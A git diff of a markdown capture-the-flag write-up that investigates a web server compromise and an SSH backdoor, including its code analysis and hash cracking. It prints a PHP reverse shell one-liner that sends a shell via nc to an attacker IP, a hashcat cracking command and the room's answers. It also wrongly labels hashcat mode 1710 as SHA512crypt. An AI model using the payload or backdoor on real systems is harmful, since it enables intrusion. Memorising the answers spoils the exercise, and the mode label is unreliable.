@@ -47,76 +47,103 @@ _URL used to upload the reverse the shell_
 **What is a reverse shell?**  
 A reverse shell is a technique where the compromised victim machine actively connects back to the attacker’s computer. This is very common because most firewalls allow outbound connections but block inbound ones.
 
-Question: What payload did the attacker use to gain access? <br>
-Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>
+**Question:** What payload did the attacker use to gain access? <br>
+**Answer:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>` <br>
 
 <img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
 _Reverse shell payload used by attacker_
 
-Let's try and understand what the script does before proceeding with the investigation:
-- It is PHP script is a reverse shell payload that forces a compromised Linux server to bypass firewalls by initiating an outbound network connection back to an attacker's machine at 192.168.170.145 on port 4242.
-- It uses the exec() function to create a temporary named pipe (/tmp/f), which acts as a two-way communication bridge on the system.
-- The script then launches an interactive Unix command shell (/bin/sh -i), binds it to the network using Netcat (nc), and routes the attacker's remote inputs directly into the server's command terminal—granting them complete, interactive control over the host.
+**Step-by-step explanation of the payload:**
+- `rm /tmp/f` → Removes any old named pipe
+- `mkfifo /tmp/f` → Creates a new named pipe (a special file for communication)
+- `cat /tmp/f | /bin/sh -i 2>&1` → Runs an interactive shell and sends both output and errors
+- `| nc 192.168.170.145 4242` → Sends everything to the attacker’s IP on port 4242
+- `> /tmp/f` → Closes the loop
 
-Question: What password did the attacker use to privesc? <br>
-Answer: **whenevernoteartinstant**
+This gives the attacker a shell on the server.
 
-To get the answer, we filter for http traffic using the filter `http` and analyze the filtered results. Attackers are notorius for using unencrypted protocols such as http and ftp. Filtering for this in a traffic dump can easily tell the analyst the actions of the attacker. Analysis of the attacker activity shows the attacker upgrading from the reverse shell, which is not always stable, to Fully Interactive TTY shell, which is stable. We are also able to see the password used for privilege escalation, _whenevernoteartinstant_ <br>
+**Question:** What password did the attacker use to privesc? <br>
+**Answer:** `whenevernoteartinstant`
+
+**How to find it:**
+1. Apply a simple filter in Wireshark: `http`
+2. Follow the TCP streams of the HTTP traffic.
+3. You will see the attacker interacting with the server and typing (or using) this password to escalate privileges from a normal user to root/admin level.
 
 <img width="1152" height="253" alt="task 1 3" src="https://github.com/user-attachments/assets/d3fd3520-ca2e-4d8a-b202-77b0d6a08ae8" /> <br>
 _Password used by attacker for privilege escalation_
 
-Question: How did the attacker establish persistence? <br>
-Answer: **https://github.com/NinjaJc01/ssh-backdoor** <br>
+**Question:** How did the attacker establish persistence?
+
+**Answer:** `https://github.com/NinjaJc01/ssh-backdoor`
+
 <img width="1171" height="87" alt="task 1 4" src="https://github.com/user-attachments/assets/02b6fa5b-684f-491b-a90a-01cf92daf599" /> <br>
 _Backdoor used by attacker for persistence_
 
-Further analysis shows the attacker cloning the backdoor https://github.com/NinjaJc01/ssh-backdoor for persistence. A backdoor is a covert method of bypassing normal authentication or security controls to gain unauthorized, persistent access to a computer system, network, or software application
+**Steps observed in the PCAP:**
+- The attacker cloned this GitHub repository.
+- Installed and configured a custom SSH backdoor listening on port 2222.
+- This allowed them to regain access even if the original reverse shell was closed.
 
-Question: Using the fasttrack wordlist, how many of the system passwords were crackable? <br>
-Answer: **4**
+**What is a backdoor?**  
+A hidden method to access a system without going through normal login procedures.
 
-To crack the hash, we create a text file which we can name _hash.txt_ and save both the hash and the salt using the format `hash:salt`. For the tool, we will be using hashcat, a higly advanced and open-source utility used to break cryptographic hashes. Coomand used to crack the hash using `rockyou.txt` dictionary:
-
-`hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt -o crackedpass.txt`
-
+**Question:** Using the fasttrack wordlist, how many of the system passwords were crackable? <br>
+**Answer:** 4
 
 ## Task 2: Research- Analyse the code
-Let us visit the GitHub link https://github.com/NinjaJc01/ssh-backdoor discovered previously for analysis/reverse engineering. Reverse engineering is the process of deconstructing and analyzing a malicious file—whether a compiled binary, an obfuscated script, or a document macro—to uncover its hidden logic, functionality, and intent without access to the original source code.
-
-We can proceed and analyse the backdoor from Github. This will act as our sandbox for static analysis. 
-<br>
+Now we analyse the backdoor source code from the GitHub repository found earlier.
 
 **Question:** What's the default hash for the backdoor? <br>
-**Answer**: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3 <br>
+**Answer**: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` 
+
 <img width="1881" height="897" alt="task 2 1" src="https://github.com/user-attachments/assets/bbb89866-e9b5-4044-bace-900d37e02e73" />
 
 _Default hash for the backdoor_
 
-Giving a keen look at main.go file, we are able to discover the default hash of the backdoor stored under the variable `hash` of string type. 
+How to find it:
+- Open the `main.go` file in the repository.
+- Look for the variable named `hash`.
 
 Question: What's the hardcoded salt for the backdoor?
 Answer: **1c362db832f3f864c8c2fe05f2002a05**
-
-Maybe before answering this question we should look at what a salt is in the context of encryption. A salt is a random string of unique data added to a plaintext password before it is run through a cryptographic hashing function.
+**What is a salt?**
+A random string added to a password before hashing. It makes precomputed attacks (like rainbow tables) much harder.
+How the backdoor works (simplified):
+1. User connects to the backdoor (port 2222).
+2. They enter a password.
+3. The backdoor adds the hardcoded salt to the password.
+4. It computes SHA-512 hash of (password + salt).
+5. If it matches the stored master hash → access granted and a shell is spawned.
 
 <img width="1589" height="945" alt="task 2 2" src="https://github.com/user-attachments/assets/35ecdc48-711a-4f1a-a166-41d5b920b447" />
 
 _Hard coded salt for the backdoor_
 
-Analysing the same file from previous question we discover thee `passwordHandler` function which acts as a secret gatekeeper for this backdoor script, completely bypassing the server's normal login security. When someone/attacker tries to connect, it takes their typed password, combines it with the hardcoded text string (**1c362db832f3f864c8c2fe05f2002a05**), and scrambles it using SHA-512 encryption. If that scrambled result matches the 128-character master key at the top of the script—which happens if they type the secret word "password"—it grants immediate access. Once let inside, the script automatically hands control over to the sshterminal section, which immediately spawns a powerful, interactive Linux terminal (`/bin/bash`) directly inside the attacker's window.
-
-Question: What was the hash that the attacker used?- go back to the
+**Question:** What was the hash that the attacker used?- go back to the
 PCAP for this!
-Answer: **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**
+**Answer:** `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
 <img width="1344" height="724" alt="task 2 3" src="https://github.com/user-attachments/assets/b5d5b3e4-cb9e-4252-a167-3e8980e0f0bf" />
 
 _Hash used by the attacker_
 
-Going back to the pcap file and following the TCP stream, we come across activity showing how the attacker configures the backdoor including generating rsa keys, giving the backdoor execution privileges and passing their own hash. Backdoor serves as persistence mechanisms for attackers.
+How to find it:
+- Go back to Wireshark.
+- Follow the TCP stream where the attacker configures the backdoor.
+- You will see them setting their own custom hash.
 
-Question: Crack the hash using rockyou and a cracking tool of your choice. What's the password? <br>
-Answer: **november16**
+**Question:** Crack the hash using rockyou and a cracking tool of your choice. What's the password? <br>
+**Answer:** `november16`
+
+**Step-by-step cracking guide:**
+1. Extract the password hashes and their salts from the system (usually from `/etc/shadow` or provided files).
+2. Combine each hash with its salt in this format: `hash:salt`
+3. Save them into a file called `hash.txt`
+4. Use **hashcat** (very fast password cracker):
+
+`hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt`
+
+`-m 1710` is the mode for SHA512crypt.
 
 ## Task 3: Attack- Get back in
 **Question:** The attacker defaced the website. What message did they leave as a heading? <br>
